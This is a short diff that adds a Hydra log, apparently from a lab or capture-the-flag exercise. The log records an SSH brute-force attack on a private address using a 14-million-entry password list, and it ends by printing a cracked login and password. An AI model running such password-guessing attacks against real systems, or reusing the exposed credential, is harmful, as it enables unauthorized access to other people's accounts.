@@ -1,3 +1,12 @@
 Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-08 23:32:05
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.64.181.122:22/
+[STATUS] 62.00 tries/min, 62 tries in 00:01h, 14344337 to do in 3856:01h, 4 active
+[STATUS] 59.33 tries/min, 178 tries in 00:03h, 14344221 to do in 4029:17h, 4 active
+[STATUS] 64.57 tries/min, 452 tries in 00:07h, 14343947 to do in 3702:21h, 4 active
+[22][ssh] host: 10.64.181.122   misc: (null)   login: jan   password: armando
+[STATUS] attack finished for 10.64.181.122 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-08 23:44:16
